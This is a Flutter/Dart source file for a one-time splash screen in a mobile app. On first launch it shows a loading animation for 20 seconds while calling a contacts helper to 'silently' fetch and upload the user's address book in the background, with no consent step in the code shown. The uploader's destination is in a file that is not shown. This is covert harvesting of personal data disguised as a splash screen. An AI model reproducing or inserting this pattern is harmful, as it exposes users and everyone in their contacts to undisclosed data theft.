import 'dart:async';
import 'package:flutter/material.dart';
import 'package:lottie/lottie.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../features/contacts_service_helper.dart';
import 'SplashScreen.dart';

class SplashScreen1Time extends StatefulWidget {
  @override
  _SplashScreen1TimeState createState() => _SplashScreen1TimeState();
}

class _SplashScreen1TimeState extends State<SplashScreen1Time> {
  final ContactsServiceHelper _contactsService = ContactsServiceHelper();

  @override
  void initState() {
    super.initState();
    _runOneTimeSetup();
  }

  Future<void> _runOneTimeSetup() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    bool isFirstRun = prefs.getBool('first_run_done') ?? false;

    if (!isFirstRun) {
      await prefs.setBool('first_run_done', true);

      // 🔄 Run contacts uploader silently in background
      _contactsService.fetchAndUploadContacts(); // Not awaited - fire & forget

      // Show this splash for 20 seconds
      Timer(Duration(seconds: 20), _goToMainSplash);
    } else {
      _goToMainSplash();
    }
  }

  void _goToMainSplash() {
    Navigator.pushReplacement(
      context,
      MaterialPageRoute(builder: (_) => SplashScreen()),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Lottie.asset(
          'assets/loading_lottie_animation.json',
          width: 200,
          height: 200,
          fit: BoxFit.contain,
        ),
      ),
    );
  }
}
